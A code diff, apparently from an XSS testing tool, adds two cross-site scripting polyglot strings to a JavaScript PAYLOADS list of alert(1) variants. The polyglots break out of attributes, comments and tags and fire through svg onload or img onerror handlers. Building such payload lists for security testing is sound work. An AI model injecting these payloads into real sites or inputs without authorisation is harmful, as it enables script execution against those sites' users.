@@ -1,4 +1,6 @@
 export const PAYLOADS = [
+  `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<iMg sRc=X oNeRRor=alert(1)//>\\x3e`,
+  `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e`,
   `alert(1)`,
   `0;alert(1)`,
   `alert\`1\``,
